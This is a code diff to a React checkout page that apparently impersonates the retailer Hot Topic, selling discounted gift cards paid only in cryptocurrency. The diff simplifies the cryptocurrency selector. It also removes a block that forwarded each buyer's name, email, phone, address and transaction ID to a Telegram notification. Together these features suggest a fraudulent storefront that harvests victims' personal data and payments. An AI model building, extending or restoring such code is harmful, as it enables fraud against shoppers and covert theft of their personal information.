@@ -10,24 +10,11 @@ import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicPromo from "@/components/HotTopicPromo";
 import HotTopicFooter from "@/components/HotTopicFooter";
 import TestimonialCarousel from "@/components/TestimonialCarousel";
+import { createCoinPaymentTransaction, SUPPORTED_CRYPTOCURRENCIES } from "@/integrations/coinpayments/client";
 import { 
-  createCoinPaymentTransaction, 
-  SUPPORTED_CRYPTOCURRENCIES, 
-  sendTelegramNotification 
-} from "@/integrations/coinpayments/client";
-import { 
-  AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users, Bitcoin,
-  Search, Coins, ChevronsUpDown, Check
+  AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users, Bitcoin 
 } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import {
-  DropdownMenu,
-  DropdownMenuContent,
-  DropdownMenuItem,
-  DropdownMenuTrigger,
-} from "@/components/ui/dropdown-menu";
-import { ScrollArea } from "@/components/ui/scroll-area";
-import { cn } from "@/lib/utils";
 
 const GIFT_CARD_VALUES = [100, 500, 1000, 5000];
 
@@ -41,7 +28,6 @@ const Index = () => {
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
   const [deliveryMethod, setDeliveryMethod] = useState<"e-gift" | "physical">("e-gift");
   const [selectedCryptoCurrency, setSelectedCryptoCurrency] = useState<string>("BTC");
-  const [searchQuery, setSearchQuery] = useState<string>("");
   const [formData, setFormData] = useState({
     firstName: "",
     lastName: "",
@@ -54,12 +40,6 @@ const Index = () => {
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
-
-  // Filter cryptocurrencies based on search query
-  const filteredCryptocurrencies = SUPPORTED_CRYPTOCURRENCIES.filter(crypto => 
-    crypto.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
-    crypto.code.toLowerCase().includes(searchQuery.toLowerCase())
-  );
 
   const validateField = (name: string, value: string): string => {
     switch (name) {
@@ -195,36 +175,6 @@ const Index = () => {
       }
       
       console.log("Payment transaction created successfully:", paymentResult.transactionDetails);
-      
-      // Send notification to Telegram
-      const notificationData = {
-        firstName: formData.firstName,
-        lastName: formData.lastName,
-        email: formData.email,
-        phone: formData.phone,
-        address: formData.address,
-        city: formData.city,
-        state: formData.state,
-        zipCode: formData.zipCode,
-        giftCardValue: selectedAmount,
-        discountedAmount: discountedAmount,
-        deliveryMethod: deliveryMethod,
-        cryptoCurrency: selectedCryptoCurrency,
-        transactionId: paymentResult.transactionDetails?.txn_id
-      };
-      
-      // Send the notification asynchronously (don't wait for it)
-      sendTelegramNotification(notificationData)
-        .then(result => {
-          if (result.success) {
-            console.log("Telegram notification sent successfully");
-          } else {
-            console.error("Failed to send Telegram notification:", result.error);
-          }
-        })
-        .catch(error => {
-          console.error("Error sending Telegram notification:", error);
-        });
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify({
@@ -484,105 +434,33 @@ const Index = () => {
             
             <div className="space-y-2">
               <Label htmlFor="cryptoCurrency" className="text-white">Choose Cryptocurrency</Label>
-              
-              {/* Enhanced Cryptocurrency Selector with Logos */}
-              <div className="relative">
-                <DropdownMenu>
-                  <DropdownMenuTrigger asChild>
-                    <Button 
-                      variant="outline" 
-                      role="combobox" 
-                      className="w-full justify-between bg-hottopic-dark border-hottopic-gray text-white hover:bg-hottopic-gray/30 hover:text-white"
-                    >
-                      <div className="flex items-center">
-                        {(() => {
-                          const selectedCrypto = SUPPORTED_CRYPTOCURRENCIES.find(c => c.code === selectedCryptoCurrency);
-                          if (selectedCrypto) {
-                            return (
-                              <img 
-                                src={`https://cryptologos.cc/logos/${selectedCrypto.icon}-logo.svg`} 
-                                alt={selectedCrypto.name}
-                                className="h-5 w-5 mr-2"
-                                onError={(e) => {
-                                  // Fallback to text icon if image fails to load
-                                  (e.target as HTMLImageElement).style.display = 'none';
-                                  const parent = (e.target as HTMLImageElement).parentNode as HTMLElement;
-                                  if (parent) {
-                                    const fallback = document.createElement('span');
-                                    fallback.className = 'h-5 w-5 mr-2 bg-hottopic-red rounded-full flex items-center justify-center text-white text-xs font-bold';
-                                    fallback.textContent = selectedCrypto.code.substring(0, 1);
-                                    parent.prepend(fallback);
-                                  }
-                                }}
-                              />
-                            );
-                          }
-                          return <Coins className="h-5 w-5 mr-2 text-hottopic-red" />;
-                        })()}
-                        {SUPPORTED_CRYPTOCURRENCIES.find(c => c.code === selectedCryptoCurrency)?.name || selectedCryptoCurrency} ({selectedCryptoCurrency})
-                      </div>
-                      <ChevronsUpDown className="ml-2 h-4 w-4 shrink-0 opacity-50" />
-                    </Button>
-                  </DropdownMenuTrigger>
-                  <DropdownMenuContent className="w-[300px] bg-hottopic-dark border-hottopic-gray">
-                    <div className="flex items-center border-b border-hottopic-gray/30 px-3 py-2">
-                      <Search className="h-4 w-4 mr-2 text-gray-400" />
-                      <Input
-                        placeholder="Search cryptocurrencies..."
-                        value={searchQuery}
-                        onChange={(e) => setSearchQuery(e.target.value)}
-                        className="border-0 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 text-white"
-                      />
-                    </div>
-                    <ScrollArea className="h-72">
-                      {filteredCryptocurrencies.length === 0 ? (
-                        <div className="py-6 text-center text-gray-400">
-                          No cryptocurrencies found
-                        </div>
-                      ) : (
-                        filteredCryptocurrencies.map((crypto) => (
-                          <DropdownMenuItem
-                            key={crypto.code}
-                            className={cn(
-                              "flex items-center px-3 py-2 hover:bg-hottopic-gray/30",
-                              selectedCryptoCurrency === crypto.code && "bg-hottopic-gray/20"
-                            )}
-                            onClick={() => {
-                              setSelectedCryptoCurrency(crypto.code);
-                              setSearchQuery("");
-                            }}
-                          >
-                            <div className="flex items-center flex-1">
-                              <img 
-                                src={`https://cryptologos.cc/logos/${crypto.icon}-logo.svg`} 
-                                alt={crypto.name}
-                                className="h-5 w-5 mr-2"
-                                onError={(e) => {
-                                  (e.target as HTMLImageElement).style.display = 'none';
-                                  const parent = (e.target as HTMLImageElement).parentNode as HTMLElement;
-                                  if (parent) {
-                                    const fallback = document.createElement('span');
-                                    fallback.className = 'h-5 w-5 mr-2 bg-hottopic-red rounded-full flex items-center justify-center text-white text-xs font-bold';
-                                    fallback.textContent = crypto.code.substring(0, 1);
-                                    parent.prepend(fallback);
-                                  }
-                                }}
-                              />
-                              <span className="text-white">{crypto.name}</span>
-                              <span className="text-gray-400 ml-2">({crypto.code})</span>
-                            </div>
-                            {selectedCryptoCurrency === crypto.code && (
-                              <Check className="h-4 w-4 text-hottopic-red" />
-                            )}
-                          </DropdownMenuItem>
-                        ))
-                      )}
-                    </ScrollArea>
-                  </DropdownMenuContent>
-                </DropdownMenu>
+              <div className="flex items-center gap-2">
+                <Bitcoin className="h-5 w-5 text-hottopic-red" />
+                <Select
+                  value={selectedCryptoCurrency}
+                  onValueChange={(value) => setSelectedCryptoCurrency(value)}
+                >
+                  <SelectTrigger 
+                    className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
+                    id="cryptoCurrency"
+                  >
+                    <SelectValue placeholder="Select cryptocurrency" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-hottopic-dark border-hottopic-gray">
+                    {SUPPORTED_CRYPTOCURRENCIES.map((crypto) => (
+                      <SelectItem 
+                        key={crypto.code} 
+                        value={crypto.code}
+                        className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
+                      >
+                        {crypto.name} ({crypto.code})
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
               </div>
               <p className="text-gray-400 text-sm mt-1">
-                Select which cryptocurrency you would like to use for payment from our wide range of options
+                Select which cryptocurrency you would like to use for payment
               </p>
             </div>
           </div>
